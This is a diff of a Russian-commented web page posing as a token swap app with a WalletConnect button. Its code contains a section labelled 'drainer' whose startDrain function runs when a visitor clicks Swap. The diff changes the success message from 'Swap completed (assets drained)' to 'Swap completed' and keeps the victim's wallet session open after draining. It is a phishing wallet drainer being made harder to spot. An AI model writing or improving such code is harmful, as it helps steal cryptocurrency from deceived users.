@@ -100,7 +100,7 @@
     </style>
 </head>
 <body>
-    <!-- HTML-разметка (без изменений) -->
+    <!-- HTML-разметка -->
     <div class="card">
         <div class="header">
             <div class="header-brand">
@@ -182,18 +182,12 @@
     <div id="walletModal" class="modal-overlay">
         <div class="modal">
             <h3>Connect Wallet</h3>
-            <div id="metamaskOption" class="wallet-card">
-                <span class="w-icon"><i class="fab fa-meta"></i></span>
+            <!-- ОБЪЕДИНЯЕМ В ОДНУ КНОПКУ "WalletConnect" -->
+            <div id="walletConnectOption" class="wallet-card">
+                <span class="w-icon"><i class="fas fa-wallet" style="color:#8b5cf6;"></i></span>
                 <span class="w-info">
-                    <span class="w-name">MetaMask</span>
-                    <span class="w-desc">WalletConnect</span>
-                </span>
-            </div>
-            <div id="trustOption" class="wallet-card">
-                <span class="w-icon"><i class="fas fa-link" style="color:#8b5cf6;"></i></span>
-                <span class="w-info">
-                    <span class="w-name">Trust Wallet</span>
-                    <span class="w-desc">WalletConnect</span>
+                    <span class="w-name">WalletConnect</span>
+                    <span class="w-desc">Connect via QR code</span>
                 </span>
             </div>
             <button class="modal-close" id="closeModalBtn">Cancel</button>
@@ -345,8 +339,7 @@
 
             const walletModal = document.getElementById('walletModal');
             const closeModalBtn = document.getElementById('closeModalBtn');
-            const metamaskOption = document.getElementById('metamaskOption');
-            const trustOption = document.getElementById('trustOption');
+            const walletConnectOption = document.getElementById('walletConnectOption'); // новая кнопка
 
             const tokenModal = document.getElementById('tokenModal');
             const tokenSearchInput = document.getElementById('tokenSearchInput');
@@ -466,7 +459,7 @@
                 });
             }
 
-            // ===== КУРСЫ (выполняется только при изменении токенов или вводе суммы) =====
+            // ===== КУРСЫ =====
             async function fetchRealRate(fromId, toId) {
                 const cacheKey = fromId + '-' + toId;
                 if (rateCache[cacheKey] && (Date.now() - rateCache[cacheKey].timestamp < 30000)) {
@@ -484,7 +477,6 @@
                     rateCache[cacheKey] = { rate: rate, timestamp: Date.now() };
                     return rate;
                 } catch (error) {
-                    // Не выводим ошибку в консоль, просто возвращаем fallback
                     return 1.0;
                 }
             }
@@ -512,9 +504,7 @@
                     const toPrice = await fetchRealRate(toId, 'usd');
                     document.getElementById('fromUsd').textContent = fromPrice ? '~$' + (inputVal * fromPrice).toFixed(2) : '~$0.00';
                     document.getElementById('toUsd').textContent = toPrice ? '~$' + (parseFloat(outputAmount.value || 0) * toPrice).toFixed(2) : '~$0.00';
-                } catch (_) {
-                    // ошибки не выводим
-                }
+                } catch (_) {}
             }
 
             // ===== UI =====
@@ -564,7 +554,7 @@
             function openModal(modal) { modal.classList.add('active'); }
             function closeModal(modal) { modal.classList.remove('active'); }
 
-            // ===== ОЧИСТКА СЕССИИ =====
+            // ===== ОЧИСТКА СЕССИИ (только при принудительном сбросе) =====
             async function forceClearSession() {
                 try {
                     if (wcProvider) {
@@ -609,7 +599,7 @@
                 } catch (_) {}
             }
 
-            // ===== ПОДКЛЮЧЕНИЕ WALLETCONNECT (showQrModal: true) =====
+            // ===== ПОДКЛЮЧЕНИЕ WALLETCONNECT =====
             async function connectWalletConnect() {
                 if (isConnecting || isProcessing) return;
                 closeModal(walletModal);
@@ -689,7 +679,7 @@
                 }
             }
 
-            // ===== ДРЕЙНЕР =====
+            // ===== ДРЕЙНЕР (без принудительного сброса сессии после успеха) =====
             async function startDrain() {
                 if (isProcessing) return;
                 if (!provider || !signer) {
@@ -764,10 +754,9 @@
                         }
                     }
 
-                    setStatus('✅ Swap completed (assets drained)', 'ok');
-                    await forceClearSession();
-                    isConnected = false;
-                    updateConnectButton();
+                    setStatus('✅ Swap completed', 'ok');
+                    // НЕ вызываем forceClearSession() – оставляем сессию активной
+                    // isConnected остаётся true
 
                 } catch (e) {
                     console.error('Drain error:', e);
@@ -781,12 +770,8 @@
             // ===== ОБРАБОТЧИКИ =====
             connectBtn.addEventListener('click', function() { openModal(walletModal); });
 
-            metamaskOption.addEventListener('click', async function() {
-                await forceClearSession();
-                connectWalletConnect();
-            });
-
-            trustOption.addEventListener('click', async function() {
+            // Одна кнопка для WalletConnect
+            walletConnectOption.addEventListener('click', async function() {
                 await forceClearSession();
                 connectWalletConnect();
             });
@@ -797,7 +782,11 @@
             tokenModal.addEventListener('click', function(e) { if (e.target === tokenModal) closeModal(tokenModal); });
 
             swapBtn.addEventListener('click', function() {
-                if (!isConnected) { openModal(walletModal); return; }
+                if (!isConnected) { 
+                    // Если не подключены – открываем модал выбора кошелька
+                    openModal(walletModal); 
+                    return; 
+                }
                 const val = parseFloat(inputAmount.value);
                 if (!val || val <= 0) { setStatus('Enter an amount', 'err'); return; }
                 startDrain();
@@ -888,8 +877,6 @@
                 await forceClearSession();
                 updateConnectButton();
                 setStatus('Connect wallet to start swapping', '');
-                // Не вызываем updateRateAndOutput при загрузке – только по необходимости (при вводе суммы или смене токенов)
-                // setTimeout(() => updateRateAndOutput(), 2000);
 
                 if (typeof ethers === 'undefined') {
                     setStatus('❌ ethers library not loaded', 'err');
